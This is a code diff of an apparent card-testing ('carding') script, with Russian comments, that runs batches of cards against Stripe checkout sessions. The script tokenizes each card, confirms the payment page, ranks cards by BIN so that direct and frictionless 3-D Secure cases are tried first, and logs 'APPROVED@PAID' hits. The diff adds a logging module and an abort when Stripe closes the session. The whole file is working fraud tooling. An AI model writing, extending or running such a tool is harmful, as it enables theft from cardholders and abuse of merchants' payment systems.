@@ -20,6 +20,7 @@ import gate_client as gc
 import stripe_fid
 import bin_steering
 import frictionless_engine
+import pusto_logger as _log
 
 sys.stdout.reconfigure(line_buffering=True, encoding="utf-8")
 
@@ -154,14 +155,17 @@ class CsHitSession:
                                       data=gc.tokenize_body(card, telem, self.url),
                                       headers=gc.TOKENIZE_HEADERS, timeout=10)
             td = r_tok.json()
+            _log.log_http("POST", "https://api.stripe.com/v1/payment_methods", r_tok.status_code)
         except Exception as e:
             return {"status": "ERROR", "detail": f"tokenize: {type(e).__name__}: {e}"[:150]}
         if "id" not in td:
             err = td.get("error", {})
+            _log.log_stripe("TOKENIZE_FAIL", gc.mask_pan(card_raw), str(err.get("code", "error"))[:40], str(err.get("message", ""))[:60])
             return {"status": gc.classify_verdict(str(err.get("message", "")) + str(err.get("code", ""))),
                     "detail": err.get("message", str(td))[:200],
                     "steering_category": profile.category.value,
                     "confidence": profile.confidence_score}
+        _log.log_stripe("TOKENIZE_OK", td["id"], detail=gc.mask_pan(card_raw))
         body = {
             "key": self.pk,
             "eid": str(uuid.uuid4()),
@@ -181,6 +185,7 @@ class CsHitSession:
                                            "Referer": "https://js.stripe.com/",
                                            "Accept": "application/json"}, timeout=20)
             resp = r.json()
+            _log.log_http("POST", f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm", r.status_code)
         except Exception as e:
             return {"status": "ERROR", "detail": f"confirm: {type(e).__name__}: {e}"[:150]}
         self.confirms += 1
@@ -264,8 +269,10 @@ class CsHitSession:
                     )
                     outcome = f_res.get("outcome")
                     if outcome == "FRICTIONLESS_PASSED":
+                        _log.log_stripe("FRICTIONLESS", self.cs[:14], "PASSED", f"{self.amount}{self.currency}")
                         return "APPROVED@PAID", f"3DS2 frictionless passed ({self.amount}{self.currency})"
                     elif outcome == "CHALLENGE_REQUIRED":
+                        _log.log_stripe("FRICTIONLESS", self.cs[:14], "CHALLENGE", "issuer requires OTP")
                         return "3DS_CHALLENGE", "3DS2 challenge (transStatus=C, enrolled)"
                 
                 # Fallback по типу SDK
@@ -325,10 +332,10 @@ async def main():
     # Предварительная оценка и приоритизация пула карт через BinSteeringEngine
     engine = bin_steering.BinSteeringEngine()
     queue = await engine.split_queue(cards)
-    print(f"[*] BIN STEERING: {len(queue[bin_steering.ThreeDsCategory.DIRECT_CHECKOUT])} DIRECT_PASS | "
-          f"{len(queue[bin_steering.ThreeDsCategory.FRICTIONLESS_CANDIDATE])} FRICTIONLESS | "
-          f"{len(queue[bin_steering.ThreeDsCategory.CHALLENGE_MANDATORY])} CHALLENGE | "
-          f"{len(queue[bin_steering.ThreeDsCategory.INVALID])} INVALID")
+    _log.log_hit(f"BIN STEERING queue: {len(queue[bin_steering.ThreeDsCategory.DIRECT_CHECKOUT])} DIRECT_PASS | "
+                 f"{len(queue[bin_steering.ThreeDsCategory.FRICTIONLESS_CANDIDATE])} FRICTIONLESS | "
+                 f"{len(queue[bin_steering.ThreeDsCategory.CHALLENGE_MANDATORY])} CHALLENGE | "
+                 f"{len(queue[bin_steering.ThreeDsCategory.INVALID])} INVALID")
     print("=" * 80)
 
     # Приоритетный порядок: DIRECT_CHECKOUT -> FRICTIONLESS -> CHALLENGE
@@ -355,8 +362,15 @@ async def main():
             t0 = time.perf_counter()
             res = await gs.check_card(c)
             lat = int((time.perf_counter() - t0) * 1000)
+            st = str(res.get("status", "?"))
             steer_tag = f"[{res.get('steering_category', '?')[:6]}]"
-            print(f">>> [{res.get('status', '?'):18}] {steer_tag:8} {gc.mask_pan(c)} ({lat}ms) -> {res.get('detail', '')[:100]}", flush=True)
+            print(f">>> [{st:18}] {steer_tag:8} {gc.mask_pan(c)} ({lat}ms) -> {res.get('detail', '')[:100]}", flush=True)
+            _log.log_verdict("hit", gc.mask_pan(c), st,
+                             detail=str(res.get("detail", ""))[:60], latency_ms=lat)
+            if st in ("SESSION_EXPIRED", "SESSION_CANCELED"):
+                print(f"[!] Сессия закрыта со стороны Stripe ({st}). Дальнейшие карты не проверяются, остановка очереди.")
+                _log.log_hit(f"Session terminated by Stripe: {st}. Remaining cards aborted.")
+                break
             if i < len(cards) - 1:
                 await asyncio.sleep(1.5)
     finally:
